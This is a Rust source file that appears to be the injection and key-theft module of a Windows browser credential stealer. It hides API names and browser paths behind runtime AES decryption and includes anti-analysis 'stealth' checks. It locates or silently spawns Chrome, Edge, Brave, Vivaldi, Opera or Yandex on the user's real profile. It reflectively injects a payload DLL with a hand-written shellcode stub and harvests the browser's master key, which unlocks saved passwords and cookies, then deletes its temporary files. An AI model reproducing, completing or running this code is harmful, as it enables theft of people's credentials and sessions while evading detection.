mod browsers;
pub mod syscall;
pub mod dynapi;
pub mod stealth;
mod polymorphic_keys;
use std::{
    env, ffi::OsStr, fs, mem, os::windows::ffi::OsStrExt,
    path::{Path, PathBuf},
    time::{SystemTime, UNIX_EPOCH},
};

use serde_json::Value;

#[repr(C)]
#[allow(non_snake_case)]
pub struct STARTUPINFOW {
    pub cb: u32,
    pub _reserved1: *mut u16,
    pub _desktop: *mut u16,
    pub _title: *mut u16,
    pub dwX: u32,
    pub dwY: u32,
    pub dwXSize: u32,
    pub dwYSize: u32,
    pub dwXCountChars: u32,
    pub dwYCountChars: u32,
    pub dwFillAttribute: u32,
    pub dwFlags: u32,
    pub wShowWindow: u16,
    pub _reserved2: u16,
    pub _reserved3: *mut u8,
    pub hStdInput: *mut std::ffi::c_void,
    pub hStdOutput: *mut std::ffi::c_void,
    pub hStdError: *mut std::ffi::c_void,
}

#[repr(C)]
#[allow(non_snake_case)]
pub struct PROCESS_INFORMATION {
    pub hProcess: *mut std::ffi::c_void,
    pub hThread: *mut std::ffi::c_void,
    pub dwProcessId: u32,
    pub dwThreadId: u32,
}



use polymorphic_keys::aes_decrypt;

fn wide(s: &str) -> Vec<u16> { OsStr::new(s).encode_wide().chain(Some(0)).collect() }

fn session_tag() -> String {
    let nanos = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_nanos();
    format!("{:x}{:x}", std::process::id(), nanos)
}

struct Cleanup { files: Vec<PathBuf>, spawned_pid: Option<u32> }

impl Cleanup {
    fn new() -> Self { Self { files: Vec::new(), spawned_pid: None } }
    fn track_file(&mut self, path: PathBuf) { self.files.push(path); }
}

impl Drop for Cleanup {
    fn drop(&mut self) {
        if let Some(pid) = self.spawned_pid.take() {
            unsafe {
                let k32 = crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0));
                if let Some(base) = k32 {
                    let open_name = aes_decrypt(&polymorphic_keys::OPEN_PROC_ENC, &polymorphic_keys::OPEN_PROC_KEY, &polymorphic_keys::OPEN_PROC_NONCE);
                    let term_name = aes_decrypt(&polymorphic_keys::TERM_PROC_ENC, &polymorphic_keys::TERM_PROC_KEY, &polymorphic_keys::TERM_PROC_NONCE);
                    let close_name = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC, &polymorphic_keys::CLOSE_H_KEY, &polymorphic_keys::CLOSE_H_NONCE);
                    if let Some(open_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&open_name)) {
                        let open: unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void = std::mem::transmute(open_fn);
                        let proc = open(0x0001, 0, pid);
                        if !proc.is_null() {
                            if let Some(term_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&term_name)) {
                                let term: unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> i32 = std::mem::transmute(term_fn);
                                term(proc, 0xC0000005u32);
                            }
                            if let Some(close_fn) = crate::syscall::resolve_export(base, core::str::from_utf8_unchecked(&close_name)) {
                                let close: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 = std::mem::transmute(close_fn);
                                close(proc);
                            }
                        }
                    }
                }
            }
        }
        for f in &self.files { let _ = fs::remove_file(f); }
    }
}

fn find_browser_pids(target_exe: &str) -> Vec<u32> {
    use std::ffi::c_void;
    #[repr(C)]
    #[derive(Clone)]
    struct PE32W { dw_size: u32, cnt_usage: u32, th32_process_id: u32, th32_default_heap_id: usize, th32_module_id: u32, cnt_threads: u32, th32_parent_process_id: u32, pc_pri_class_base: i32, dw_flags: u32, sz_exe_file: [u16; 260] }
    unsafe {
        let mut pids = Vec::new();
        let k32 = match syscall::get_module_base(crate::stealth::stealth_dll_name(0)) { Some(b) => b, None => return pids };
        let cs_name = aes_decrypt(&polymorphic_keys::CTX_SNAP_ENC, &polymorphic_keys::CTX_SNAP_KEY, &polymorphic_keys::CTX_SNAP_NONCE);
        let pf_name = aes_decrypt(&polymorphic_keys::P32_FIRST_ENC, &polymorphic_keys::P32_FIRST_KEY, &polymorphic_keys::P32_FIRST_NONCE);
        let pn_name = aes_decrypt(&polymorphic_keys::P32_NEXT_ENC, &polymorphic_keys::P32_NEXT_KEY, &polymorphic_keys::P32_NEXT_NONCE);
        let ch_name = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC, &polymorphic_keys::CLOSE_H_KEY, &polymorphic_keys::CLOSE_H_NONCE);
        let cs: Option<unsafe extern "system" fn(u32, u32) -> *mut c_void> = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&cs_name)).map(|a| std::mem::transmute(a));
        let pf: Option<unsafe extern "system" fn(*mut c_void, *mut PE32W) -> i32> = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&pf_name)).map(|a| std::mem::transmute(a));
        let pn: Option<unsafe extern "system" fn(*mut c_void, *mut PE32W) -> i32> = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&pn_name)).map(|a| std::mem::transmute(a));
        let ch: Option<unsafe extern "system" fn(*mut c_void) -> i32> = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&ch_name)).map(|a| std::mem::transmute(a));
        let (Some(cs), Some(pf), Some(pn), Some(ch)) = (cs, pf, pn, ch) else { return pids };
        let snap = cs(0x00000002, 0);
        if snap.is_null() || snap as isize == -1 { return pids; }
        let mut entry: PE32W = std::mem::zeroed();
        entry.dw_size = std::mem::size_of::<PE32W>() as u32;
        if pf(snap, &mut entry) == 0 { ch(snap); return pids; }
        loop {
            let len = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
            let exe_str = String::from_utf16_lossy(&entry.sz_exe_file[..len]).to_lowercase();
            if exe_str == target_exe.to_lowercase() && entry.th32_process_id != 0 { pids.push(entry.th32_process_id); }
            if pn(snap, &mut entry) == 0 { break; }
        }
        ch(snap);
        pids
    }
}

fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
    let local_k = aes_decrypt(&polymorphic_keys::INJ_PATH_LOCALAPPDATA_ENC, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_KEY, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_NONCE);
    let pf_k    = aes_decrypt(&polymorphic_keys::INJ_PATH_PROGRAMFILES_ENC, &polymorphic_keys::INJ_PATH_PROGRAMFILES_KEY, &polymorphic_keys::INJ_PATH_PROGRAMFILES_NONCE);
    let pf86_k  = aes_decrypt(&polymorphic_keys::INJ_PATH_PF86_ENC, &polymorphic_keys::INJ_PATH_PF86_KEY, &polymorphic_keys::INJ_PATH_PF86_NONCE);
    let local_k = String::from_utf8_lossy(&local_k).into_owned();
    let pf_k    = String::from_utf8_lossy(&pf_k).into_owned();
    let pf86_k  = String::from_utf8_lossy(&pf86_k).into_owned();
    let local = env::var(&local_k).unwrap_or_default();
    let pf    = env::var(&pf_k).unwrap_or_default();
    let pf86  = env::var(&pf86_k).unwrap_or_default();
    let chrome_p = aes_decrypt(&polymorphic_keys::INJ_PATH_CHROME_APP_ENC, &polymorphic_keys::INJ_PATH_CHROME_APP_KEY, &polymorphic_keys::INJ_PATH_CHROME_APP_NONCE);
    let edge_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_EDGE_APP_ENC,   &polymorphic_keys::INJ_PATH_EDGE_APP_KEY,   &polymorphic_keys::INJ_PATH_EDGE_APP_NONCE);
    let chrome_p = String::from_utf8_lossy(&chrome_p).into_owned();
    let edge_p   = String::from_utf8_lossy(&edge_p).into_owned();
    let chrome_enc = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
    let edge_enc   = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC,   &polymorphic_keys::INJ_EDGE_EXE_KEY,   &polymorphic_keys::INJ_EDGE_EXE_NONCE);
    let chrome_exe = String::from_utf8_lossy(&chrome_enc).into_owned();
    let edge_exe   = String::from_utf8_lossy(&edge_enc).into_owned();
    if exe_name == chrome_exe {
        let paths = [PathBuf::from(&local).join(&chrome_p), PathBuf::from(&pf).join(&chrome_p), PathBuf::from(&pf86).join(&chrome_p)];
        for p in paths { if p.exists() { return Some(p); } }
    } else if exe_name == edge_exe {
        let paths = [PathBuf::from(&local).join(&edge_p), PathBuf::from(&pf).join(&edge_p), PathBuf::from(&pf86).join(&edge_p)];
        for p in paths { if p.exists() { return Some(p); } }
    }
    None
}

fn find_browser_exe_on_disk(target_exe: &str) -> Option<String> {
    let local_k = aes_decrypt(&polymorphic_keys::INJ_PATH_LOCALAPPDATA_ENC, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_KEY, &polymorphic_keys::INJ_PATH_LOCALAPPDATA_NONCE);
    let pf_k    = aes_decrypt(&polymorphic_keys::INJ_PATH_PROGRAMFILES_ENC, &polymorphic_keys::INJ_PATH_PROGRAMFILES_KEY, &polymorphic_keys::INJ_PATH_PROGRAMFILES_NONCE);
    let pf86_k  = aes_decrypt(&polymorphic_keys::INJ_PATH_PF86_ENC, &polymorphic_keys::INJ_PATH_PF86_KEY, &polymorphic_keys::INJ_PATH_PF86_NONCE);
    let local_k = String::from_utf8_lossy(&local_k).into_owned();
    let pf_k    = String::from_utf8_lossy(&pf_k).into_owned();
    let pf86_k  = String::from_utf8_lossy(&pf86_k).into_owned();
    let local = env::var(&local_k).unwrap_or_default();
    let pf    = env::var(&pf_k).unwrap_or_default();
    let pf86  = env::var(&pf86_k).unwrap_or_default();

    let chrome_enc  = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC,  &polymorphic_keys::INJ_CHROME_EXE_KEY,  &polymorphic_keys::INJ_CHROME_EXE_NONCE);
    let edge_enc    = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC,    &polymorphic_keys::INJ_EDGE_EXE_KEY,    &polymorphic_keys::INJ_EDGE_EXE_NONCE);
    let brave_enc   = aes_decrypt(&polymorphic_keys::INJ_BRAVE_EXE_ENC,   &polymorphic_keys::INJ_BRAVE_EXE_KEY,   &polymorphic_keys::INJ_BRAVE_EXE_NONCE);
    let vivaldi_enc = aes_decrypt(&polymorphic_keys::INJ_VIVALDI_EXE_ENC, &polymorphic_keys::INJ_VIVALDI_EXE_KEY, &polymorphic_keys::INJ_VIVALDI_EXE_NONCE);
    let opera_enc   = aes_decrypt(&polymorphic_keys::INJ_OPERA_EXE_ENC,   &polymorphic_keys::INJ_OPERA_EXE_KEY,   &polymorphic_keys::INJ_OPERA_EXE_NONCE);
    let browser_enc = aes_decrypt(&polymorphic_keys::INJ_BROWSER_EXE_ENC, &polymorphic_keys::INJ_BROWSER_EXE_KEY, &polymorphic_keys::INJ_BROWSER_EXE_NONCE);

    let chrome_p  = aes_decrypt(&polymorphic_keys::INJ_PATH_CHROME_APP_ENC,  &polymorphic_keys::INJ_PATH_CHROME_APP_KEY,  &polymorphic_keys::INJ_PATH_CHROME_APP_NONCE);
    let edge_p    = aes_decrypt(&polymorphic_keys::INJ_PATH_EDGE_APP_ENC,    &polymorphic_keys::INJ_PATH_EDGE_APP_KEY,    &polymorphic_keys::INJ_PATH_EDGE_APP_NONCE);
    let brave_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_BRAVE_APP_ENC,   &polymorphic_keys::INJ_PATH_BRAVE_APP_KEY,   &polymorphic_keys::INJ_PATH_BRAVE_APP_NONCE);
    let vivaldi_p = aes_decrypt(&polymorphic_keys::INJ_PATH_VIVALDI_APP_ENC, &polymorphic_keys::INJ_PATH_VIVALDI_APP_KEY, &polymorphic_keys::INJ_PATH_VIVALDI_APP_NONCE);
    let opera_p   = aes_decrypt(&polymorphic_keys::INJ_PATH_OPERA_APP_ENC,   &polymorphic_keys::INJ_PATH_OPERA_APP_KEY,   &polymorphic_keys::INJ_PATH_OPERA_APP_NONCE);
    let yandex_p  = aes_decrypt(&polymorphic_keys::INJ_PATH_YANDEX_APP_ENC,  &polymorphic_keys::INJ_PATH_YANDEX_APP_KEY,  &polymorphic_keys::INJ_PATH_YANDEX_APP_NONCE);

    let chrome_p  = String::from_utf8_lossy(&chrome_p).into_owned();
    let edge_p    = String::from_utf8_lossy(&edge_p).into_owned();
    let brave_p   = String::from_utf8_lossy(&brave_p).into_owned();
    let vivaldi_p = String::from_utf8_lossy(&vivaldi_p).into_owned();
    let opera_p   = String::from_utf8_lossy(&opera_p).into_owned();
    let yandex_p  = String::from_utf8_lossy(&yandex_p).into_owned();

    let mut candidates: Vec<PathBuf> = Vec::new();
    if let Some(p) = get_browser_exe_from_registry(target_exe) { candidates.push(p); }

    if target_exe == String::from_utf8_lossy(&chrome_enc) {
        candidates.push(PathBuf::from(&pf).join(&chrome_p));
        candidates.push(PathBuf::from(&pf86).join(&chrome_p));
        candidates.push(PathBuf::from(&local).join(&chrome_p));
    } else if target_exe == String::from_utf8_lossy(&edge_enc) {
        candidates.push(PathBuf::from(&pf).join(&edge_p));
        candidates.push(PathBuf::from(&pf86).join(&edge_p));
        candidates.push(PathBuf::from(&local).join(&edge_p));
    } else if target_exe == String::from_utf8_lossy(&brave_enc) {
        candidates.push(PathBuf::from(&pf).join(&brave_p));
        candidates.push(PathBuf::from(&pf86).join(&brave_p));
        candidates.push(PathBuf::from(&local).join(&brave_p));
    } else if target_exe == String::from_utf8_lossy(&vivaldi_enc) {
        candidates.push(PathBuf::from(&local).join(&vivaldi_p));
        candidates.push(PathBuf::from(&pf).join(&vivaldi_p));
    } else if target_exe == String::from_utf8_lossy(&opera_enc) {
        candidates.push(PathBuf::from(&local).join(&opera_p));
    } else if target_exe == String::from_utf8_lossy(&browser_enc) {
        candidates.push(PathBuf::from(&local).join(&yandex_p));
        candidates.push(PathBuf::from(&pf).join(&yandex_p));
    }
    for path in candidates { if path.exists() { return Some(path.to_string_lossy().into_owned()); } }
    None
}

fn resolve_browser_exe(target_exe: &str) -> Option<String> { find_browser_exe_on_disk(target_exe) }

fn rva_to_offset(dll_data: &[u8], rva: u32) -> Option<u32> {
    unsafe {
        let base = dll_data.as_ptr();
        let e_lfanew = *(base.add(0x3C) as *const i32);
        let nt = base.add(e_lfanew as usize);
        let sig = core::ptr::read_unaligned(nt as *const u32);
        if sig != 0x00004550 { return None; }
        let file_hdr = nt.add(4);
        let size_opt = core::ptr::read_unaligned(file_hdr.add(16) as *const u16) as usize;
        let num_sections = core::ptr::read_unaligned(file_hdr.add(2) as *const u16) as usize;
        let opt_hdr = nt.add(24);
        let size_of_headers = core::ptr::read_unaligned(opt_hdr.add(60) as *const u32);
        if rva < size_of_headers { return Some(rva); }
        let sections = opt_hdr.add(size_opt);
        for i in 0..num_sections {
            let sec = sections.add(i * 40);
            let va = core::ptr::read_unaligned(sec.add(12) as *const u32);
            let raw = core::ptr::read_unaligned(sec.add(20) as *const u32);
            let raw_sz = core::ptr::read_unaligned(sec.add(16) as *const u32);
            if rva >= va && rva < va + raw_sz {
                return Some(raw + (rva - va));
            }
        }
        None
    }
}

fn find_export_file_offset(dll_data: &[u8], name: &str) -> Option<u32> {
    unsafe {
        let base = dll_data.as_ptr();
        let dll_len = dll_data.len();
        let e_lfanew = *(base.add(0x3C) as *const i32);
        let nt = base.add(e_lfanew as usize);
        let sig = core::ptr::read_unaligned(nt as *const u32);
        if sig != 0x00004550 { return None; }
        let file_hdr = nt.add(4);
        let _opt_hdr_size = core::ptr::read_unaligned(file_hdr.add(16) as *const u16) as usize;
        let opt_hdr = nt.add(24);
        let dd0_rva = core::ptr::read_unaligned(opt_hdr.add(112) as *const u32);
        if dd0_rva == 0 { return None; }
        let export_fo = match rva_to_offset(dll_data, dd0_rva) {
            Some(o) => o,
            None => { return None; }
        };
        if (export_fo as usize) + 40 > dll_len { return None; }
        let exp = base.add(export_fo as usize);
        let num_names = core::ptr::read_unaligned(exp.add(24) as *const u32);
        let num_funcs = core::ptr::read_unaligned(exp.add(20) as *const u32);
        let addr_names_rva = core::ptr::read_unaligned(exp.add(32) as *const u32);
        let addr_funcs_rva = core::ptr::read_unaligned(exp.add(28) as *const u32);
        let addr_ords_rva = core::ptr::read_unaligned(exp.add(36) as *const u32);
        if num_names > 10000 || num_funcs > 10000 { return None; }

        let names_fo = match rva_to_offset(dll_data, addr_names_rva) {
            Some(o) => o,
            None => { return None; }
        };
        let funcs_fo = match rva_to_offset(dll_data, addr_funcs_rva) {
            Some(o) => o,
            None => { return None; }
        };
        let ords_fo = match rva_to_offset(dll_data, addr_ords_rva as u32) {
            Some(o) => o,
            None => { return None; }
        };
        if (names_fo as usize) + (num_names as usize * 4) > dll_len { return None; }
        if (funcs_fo as usize) + (num_funcs as usize * 4) > dll_len { return None; }
        if (ords_fo as usize) + (num_names as usize * 2) > dll_len { return None; }
        let names = base.add(names_fo as usize) as *const u32;
        let functions = base.add(funcs_fo as usize) as *const u32;
        let ordinals = base.add(ords_fo as usize) as *const u16;
        let name_bytes = name.as_bytes();
        for i in 0..num_names {
            let name_rva = *names.add(i as usize);
            let name_fo = match rva_to_offset(dll_data, name_rva) {
                Some(o) => o,
                None => { continue; }
            };
            if (name_fo as usize) + name_bytes.len() + 1 > dll_len { continue; }
            let name_ptr = base.add(name_fo as usize);
            let mut matched = true;
            for (j, &b) in name_bytes.iter().enumerate() {
                if *(name_ptr.add(j)) != b { matched = false; break; }
            }
            if matched && *(name_ptr.add(name_bytes.len())) == 0 {
                let ord = *ordinals.add(i as usize) as usize;
                if ord >= num_funcs as usize { return None; }
                let func_rva = *functions.add(ord);
                let func_fo = match rva_to_offset(dll_data, func_rva) {
                    Some(o) => o,
                    None => { return None; }
                };

                return Some(func_fo);
            }
        }

        None
    }
}

fn inject_dll_reflective(pid: u32, dll_data: &[u8]) -> Result<(), ()> {

    unsafe {
        let k32 = syscall::get_module_base(crate::stealth::stealth_dll_name(0)).ok_or(())?;
        let open_name = aes_decrypt(&polymorphic_keys::OPEN_PROC_ENC, &polymorphic_keys::OPEN_PROC_KEY, &polymorphic_keys::OPEN_PROC_NONCE);
        let open_addr = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&open_name)).ok_or(())?;
        let open_fn: unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void = std::mem::transmute(open_addr);
        let proc = open_fn(0x003A, 0, pid);
        if proc.is_null() { return Err(()); }
        let result = inject_dll_reflective_inner(proc, dll_data);
        let close_name = aes_decrypt(&polymorphic_keys::CLOSE_H_ENC, &polymorphic_keys::CLOSE_H_KEY, &polymorphic_keys::CLOSE_H_NONCE);
        let close_addr = syscall::resolve_export(k32, core::str::from_utf8_unchecked(&close_name)).ok_or(())?;
        let close_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> i32 = std::mem::transmute(close_addr);
        close_fn(proc);
        result
    }
}

unsafe fn inject_dll_reflective_with_handle(proc: *mut std::ffi::c_void, dll_data: &[u8]) -> Result<(), ()> {
    inject_dll_reflective_inner(proc, dll_data)
}

unsafe fn inject_dll_reflective_inner(proc: *mut std::ffi::c_void, dll_data: &[u8]) -> Result<(), ()> {
    let rl_name = aes_decrypt(&polymorphic_keys::RL_ENC, &polymorphic_keys::RL_KEY, &polymorphic_keys::RL_NONCE);
    let rl_str = core::str::from_utf8_unchecked(&rl_name);
    let loader_fo = match find_export_file_offset(dll_data, rl_str) {
        Some(o) => o, None => { return Err(()); }
    };
    let k32 = match crate::syscall::get_module_base(crate::stealth::stealth_dll_name(0)) {
        Some(b) => b,
        None => { return Err(()); }
    };
    let dll_remote = dynapi::VirtualAllocEx(proc, std::ptr::null_mut(), dll_data.len(), 0x3000, 0x40);
    if dll_remote.is_null() { return Err(()); }
    let mut written = 0usize;
    if dynapi::WriteProcessMemory(proc, dll_remote, dll_data.as_ptr(), dll_data.len(), &mut written) == 0 {
 return Err(());
    }
    let loader_addr = dll_remote.add(loader_fo as usize);
    let mut stub_mut = [0u8; 41];
    let mut idx = 0usize;
    stub_mut[idx] = 0x48; idx += 1;
    stub_mut[idx] = 0x83; idx += 1;
    stub_mut[idx] = 0xEC; idx += 1;
    stub_mut[idx] = 0x28; idx += 1;
    stub_mut[idx] = 0x48; idx += 1;
    stub_mut[idx] = 0xB9; idx += 1;
    idx += 8;
    stub_mut[idx] = 0x48; idx += 1;
    stub_mut[idx] = 0xBA; idx += 1;
    idx += 8;
    stub_mut[idx] = 0x48; idx += 1;
    stub_mut[idx] = 0xB8; idx += 1;
    idx += 8;
    stub_mut[idx] = 0xFF; idx += 1;
    stub_mut[idx] = 0xD0; idx += 1;
    stub_mut[idx] = 0x48; idx += 1;
    stub_mut[idx] = 0x83; idx += 1;
    stub_mut[idx] = 0xC4; idx += 1;
    stub_mut[idx] = 0x28; idx += 1;
    stub_mut[idx] = 0xC3;
    stub_mut[6..14].copy_from_slice(&(dll_remote as u64).to_le_bytes());
    stub_mut[16..24].copy_from_slice(&(k32 as u64).to_le_bytes());
    stub_mut[26..34].copy_from_slice(&(loader_addr as u64).to_le_bytes());
    let stub_remote = dynapi::VirtualAllocEx(proc, std::ptr::null_mut(), stub_mut.len(), 0x3000, 0x40);
    if stub_remote.is_null() { return Err(()); }
    if dynapi::WriteProcessMemory(proc, stub_remote, stub_mut.as_ptr(), stub_mut.len(), &mut written) == 0 {
 return Err(());
    }
    let thr = dynapi::CreateRemoteThread(proc, std::ptr::null_mut(), 0, std::mem::transmute(stub_remote), std::ptr::null_mut(), 0, std::ptr::null_mut());
    if thr.is_null() || thr as isize == -1 { return Err(()); }
    dynapi::WaitForSingleObject(thr, 15000);
    dynapi::CloseHandle(thr);

    Ok(())
}

fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Path) -> Result<u32, ()> {
    let profile_str = real_profile.to_string_lossy();
    let chrome_default = aes_decrypt(&polymorphic_keys::INJ_CHROME_EXE_ENC, &polymorphic_keys::INJ_CHROME_EXE_KEY, &polymorphic_keys::INJ_CHROME_EXE_NONCE);
    let chrome_default = String::from_utf8_lossy(&chrome_default).into_owned();
    let exe_name = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or(chrome_default);

    for pid in find_browser_pids(&exe_name) {
        let dll_bytes = fs::read(dll_path).unwrap_or_default();
        if inject_dll_reflective(pid, &dll_bytes).is_ok() { return Ok(pid); }
    }

    let mut parts: Vec<String> = Vec::new();
    parts.push(format!("\"{chrome_exe}\""));
    let flags = ["--headless=new","--disable-gpu","--disable-logging","--log-level=","3","--disable-background-networking","--disable-sync","--disable-default-apps","--disable-extensions","--disable-component-update","--no-first-run","--no-default-browser-check","--noerrdialogs","--disable-dev-tools","--disable-features=Translate","--disable-ipc-flooding-protection","--disable-breakpad","--metrics-recording-only","--user-data-dir="];
    for f in &flags { parts.push(f.to_string()); }
    let last_idx = parts.len() - 1;
    parts[last_idx] = format!("{}\"{}\"", parts[last_idx], profile_str);
    let cmdline = parts.join(" ");

    let exe_w = wide(chrome_exe);
    let mut cmd_w = wide(&cmdline);
    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    unsafe {
        let cp_ok = dynapi::CreateProcessW(exe_w.as_ptr(), cmd_w.as_mut_ptr(), std::ptr::null_mut(), std::ptr::null_mut(), 0, 0x0800_0000, std::ptr::null_mut(), std::ptr::null(), &mut si as *mut _ as *mut std::ffi::c_void, &mut pi as *mut _ as *mut std::ffi::c_void);
        if cp_ok == 0 { return Err(()); }
        let pid = pi.dwProcessId;

        std::thread::sleep(std::time::Duration::from_millis(2000));
        let dll_bytes = fs::read(dll_path).unwrap_or_default();
        if dll_bytes.is_empty() { dynapi::CloseHandle(pi.hThread); dynapi::CloseHandle(pi.hProcess); return Err(()); }
        let result = inject_dll_reflective_with_handle(pi.hProcess, &dll_bytes);
        dynapi::CloseHandle(pi.hThread);
        dynapi::CloseHandle(pi.hProcess);
        match result {
            Ok(()) => { }
            Err(()) => { return Err(()); }
        }
        Ok(pid)
    }
}

fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
    if hex.len() != 64 { return None; }
    (0..hex.len()).step_by(2).map(|i| u8::from_str_radix(&hex[i..i+2], 16).ok()).collect()
}

fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
    let raw = fs::read_to_string(path).ok()?;
    let json: Value = serde_json::from_str(&raw).ok()?;
    if json.get("error").and_then(|e| e.as_str()).is_some() { return None; }
    let hex = json.get("master_key_hex")?.as_str()?;
    hex_to_key(hex)
}

pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {

    if payload_dll.is_empty() { return None; }
    let target = browsers::find_target(browser_name)?;
    let browser_exe = resolve_browser_exe(&target.exe)?;

    let tag = session_tag();
    let temp = env::temp_dir();
    let dll_path = temp.join(format!("{tag}.tmp"));
    let result_path = temp.join(format!("{tag}.json"));
    let real_profile = browsers::find_real_profile_dir(browser_name);
    let mut cleanup = Cleanup::new();
    cleanup.track_file(dll_path.clone());
    cleanup.track_file(result_path.clone());
    stealth::random_delay(100, 1000);
    if !stealth::check_process_integrity() { return None; }
    dynapi::init();
    if fs::write(&dll_path, payload_dll).is_err() { return None; }
    let _ = stealth::store_data_in_atoms(payload_dll);

    unsafe {
        let env_result = aes_decrypt(&polymorphic_keys::RESULT_ENV_ENC, &polymorphic_keys::RESULT_ENV_KEY, &polymorphic_keys::RESULT_ENV_NONCE);
        let env_user_data = aes_decrypt(&polymorphic_keys::USER_DATA_ENV_ENC, &polymorphic_keys::USER_DATA_ENV_KEY, &polymorphic_keys::USER_DATA_ENV_NONCE);
        let env_data_root = aes_decrypt(&polymorphic_keys::DATA_ROOT_ENV_ENC, &polymorphic_keys::DATA_ROOT_ENV_KEY, &polymorphic_keys::DATA_ROOT_ENV_NONCE);
        let env_browser_name = aes_decrypt(&polymorphic_keys::BROWSER_NAME_ENV_ENC, &polymorphic_keys::BROWSER_NAME_ENV_KEY, &polymorphic_keys::BROWSER_NAME_ENV_NONCE);
        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_result), &result_path.to_string_lossy());
        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_user_data), &target.user_data_rel);
        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_data_root), match target.root { browsers::DataRoot::Local => "local", browsers::DataRoot::Roaming => "roaming" });
        crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_browser_name), browser_name);
    }
    let discovered = browsers::discover_elevation_services();
    if let Some(clsid) = discovered.get(browser_name) {
        unsafe {
            let env_cls = aes_decrypt(&polymorphic_keys::BROWSER_CLSID_ENV_ENC, &polymorphic_keys::BROWSER_CLSID_ENV_KEY, &polymorphic_keys::BROWSER_CLSID_ENV_NONCE);
            crate::dynapi::set_env_var(core::str::from_utf8_unchecked(&env_cls), clsid);
        }
    }

    let profile_for_spawn = real_profile.as_ref().map(|p| p.as_path());
    let injected = 'inject: {
        if let Some(profile) = profile_for_spawn {
            if let Ok(pid) = spawn_chrome_and_inject(&browser_exe, &dll_path, profile) { cleanup.spawned_pid = Some(pid); break 'inject true; }
        }
        for pid in find_browser_pids(&target.exe) {
            let dll_bytes = fs::read(&dll_path).ok()?;
            if inject_dll_reflective(pid, &dll_bytes).is_ok() { break 'inject true; }
        }
        false
    };
    if !injected { return None; }

    for i in 0..60 {
        if result_path.exists() {

            if let Some(key) = read_key_from_result(&result_path) {
                if key.len() == 32 { return Some(key); }
            }
        }
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    None
}
